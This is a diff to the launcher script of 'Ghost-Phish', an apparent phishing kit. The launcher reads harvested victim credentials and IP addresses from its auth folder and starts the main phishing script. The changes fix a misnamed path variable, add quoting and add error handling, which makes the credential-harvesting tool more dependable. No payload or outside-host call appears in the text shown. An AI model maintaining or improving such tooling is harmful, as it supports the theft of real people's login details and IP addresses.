@@ -2,10 +2,10 @@
 
 # https://github.com/aenoshrajora/Ghost-Phish
 
-if [[ $(uname -o) == *'Android'* ]];then
+if [[ $(uname -o) == *'Android'* ]]; then
 	GHOSTPHISH_ROOT="/data/data/com.termux/files/usr/opt/ghost-phish"
 else
-	export GHOSTPHISH_ROOT_ROOT="/opt/ghost-phish"
+	GHOSTPHISH_ROOT="/opt/ghost-phish"
 fi
 
 if [[ $1 == '-h' || $1 == 'help' ]]; then
@@ -17,16 +17,19 @@ if [[ $1 == '-h' || $1 == 'help' ]]; then
 	echo " -i | ip   : View Saved Victim IP"
 	echo
 elif [[ $1 == '-c' || $1 == 'auth' ]]; then
-	cat $GHOSTPHISH_ROOT/auth/usernames.dat 2> /dev/null || { 
+	cat "$GHOSTPHISH_ROOT/auth/usernames.dat" 2> /dev/null || { 
 		echo "No Credentials Found !"
 		exit 1
 	}
 elif [[ $1 == '-i' || $1 == 'ip' ]]; then
-	cat $GHOSTPHISH_ROOT/auth/ip.txt 2> /dev/null || {
+	cat "$GHOSTPHISH_ROOT/auth/ip.txt" 2> /dev/null || {
 		echo "No Saved IP Found !"
 		exit 1
 	}
 else
-	cd $GHOSTPHISH_ROOT
+	cd "$GHOSTPHISH_ROOT" || {
+		echo "Failed to cd into $GHOSTPHISH_ROOT"
+		exit 1
+	}
 	bash ./ghost-phish.sh
 fi
